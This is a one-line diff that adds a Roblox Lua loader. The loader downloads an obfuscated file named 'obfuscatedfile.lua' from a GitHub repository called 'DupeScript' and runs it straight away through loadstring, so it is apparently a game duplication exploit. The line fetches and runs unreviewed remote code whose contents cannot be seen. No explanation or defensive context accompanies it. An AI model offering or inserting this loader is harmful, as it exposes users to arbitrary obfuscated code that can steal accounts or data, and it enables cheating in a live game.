@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kododoi/DupeScript/main/obfuscatedfile.lua", true))()
